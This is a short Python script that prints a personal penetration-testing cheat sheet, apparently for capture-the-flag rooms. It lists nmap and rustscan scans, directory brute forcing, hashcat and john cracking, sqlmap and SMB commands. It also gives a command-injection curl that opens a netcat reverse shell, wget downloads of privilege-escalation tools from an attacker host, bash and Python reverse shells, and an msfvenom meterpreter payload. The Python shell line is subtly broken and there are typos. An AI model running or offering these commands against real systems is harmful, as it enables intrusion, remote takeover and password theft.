#!/bin/python3

print('''---- ----
command alies (:
--------\n''')


print('''----initial----
sudo ip link delete tun0
ping $IP
--------\n''')

print('''----scanning----
rustscan -a $IP --ulimit 5000\n 
nmap -Pn $IP
nmap -Pn -T5 --min-rate 2500 -sC -sV -oN nmap $IP
nmap -sC -sV -p -oN nmap $IP -Pn
--------''')
print('''----Dir----
feroxbuster -u $IP -o ferobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferobuster
gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php,html,txt,xml -o gobuster
--------\n''')

print('''----hash----
hashcat -m <> -a 0 <hashfile> <wordlist>
john --wordlist=<wordlist file> <hash file>
john --wordlist=/usr/share/wordlists/rockyou.txt <hash file>
--------\n''')

print('''----SQL Server----
mysql -h 10.10.180.96 -u root -p 
--------\n''')

print('''----sqlmap----
sqlmap <url>
sqlmap <url> -p <vulnerable parameter> --dbs
sqlmap <url> -p <vulnerable parameter> --current-db <db name>
sqlmap <url> -p <vulnerable parameter> --current-db <> --tables/-T <table name> --columns/-C <column name>
--------\n''')

print('''----SMB----
smbclient -L //$IP -N --> for listing
sbmclient //$IP/share -N --> for browsing
smb> put <filename>
smb> get <filename>
--------\n''')


print('''----stagnography----
binwalk <filename> --> for checking
--------\n''')


print('''----curl----
curl http://10.10.180.96:15065/api/cmd -X POST -d 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.25.187 1234 >/tmp/f' -- revershell 
--------\n''')



print('''----chattr----
chattr +i king.txt --> to protect the file
lsattr king.txt --> to check the file permissions
--------\n''')


print('''----upload----
wget http://10.17.25.187:8000/ex
wget http://10.17.25.187:8000/linpeas.sh
wget http://10.17.25.187:8000/PowerUp.ps1
--------\n''')

print('''----reverse shells----
bash -i >& /dev/tcp/10.17.25.187/1234 0>&1\n
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.17.25.187,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
''')

print('''----metasploit----
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.25.187 LPORT=1234 -f exe > p.exe
''')
